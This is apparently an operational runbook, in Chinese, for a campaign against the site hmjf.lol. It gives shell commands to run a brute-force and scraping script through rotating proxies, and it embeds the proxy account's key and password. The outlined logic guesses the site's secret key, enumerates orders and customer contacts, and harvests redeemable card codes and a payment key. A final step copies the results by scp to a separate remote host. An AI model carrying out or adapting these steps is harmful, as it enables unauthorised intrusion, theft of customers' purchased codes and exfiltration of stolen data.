# hmjf.lol 深挖执行手册 (v6)

## 跳板机一键执行

```bash
# 1. 同步脚本（从本仓库或 /tmp 复制）
install -m755 /path/to/scripts/qg-proxy-fetch.sh /data/automation/bin/
install -m755 /path/to/scripts/kami_deep_v6.py /data/automation/bin/

# 2. 刷新代理（通道满时自动用 /query 复用已在用IP）
source /data/config/proxy.env
/data/automation/bin/qg-proxy-fetch.sh

# 3. 后台跑 v6
mkdir -p /data/automation/results/hmjf.lol/kami_mine_20260716
nohup python3 /data/automation/bin/kami_deep_v6.py \
  >> /data/automation/results/hmjf.lol/kami_mine_20260716/v6.log 2>&1 &

# 4. 盯结果
tail -f /data/automation/results/hmjf.lol/kami_mine_20260716/v6.log
grep 'HIT' /data/automation/results/hmjf.lol/kami_mine_20260716/v6.log
cat /data/automation/results/hmjf.lol/kami_mine_20260716/v6_results.json | python3 -m json.tool | head -80
```

## 青果代理通道满

`/get` 返回 `NO_AVAILABLE_CHANNEL` 时：

```bash
# 查已在用 IP
curl -s "https://share.proxy.qg.net/query?key=02E76F93&pwd=A0FFB679553D" | python3 -m json.tool

# 新手动写入 proxy.env
# PROXY_URL="http://02E76F93:A0FFB679553D@103.217.191.28:17177"
```

`qg-proxy-fetch.sh` 已支持 `/get` → `/query` → `/pool` 回退。

## v6 核心逻辑

1. **SYS_KEY 爆破** — `skey = md5(id + SYS_KEY + id)`（彩虹同源）
2. **ajax query** — `POST type=1&qq={17位trade_no}`
3. **联系人 query** — `qq=手机号/datou111`
4. **历史单** — 2025-11 起采样 + 20260716 全天
5. **易支付 key** — pid=1003 @ api.ttwl66.cn

## 命中标志

- `SYS_KEY_FOUND` — 撞出站点密钥，后续批量可读卡密
- `kminfo_*` — 真实卡密
- `ajax_query` / `hist_query` — 订单列表含 id+skey
- `PAID?` — getshop 非「未付款」

## 同步 HK 报告机

```bash
scp /data/automation/results/hmjf.lol/kami_mine_20260716/v6* \
  root@103.185.249.13:/data/automation/results/hmjf.lol/kami_mine_20260716/
```
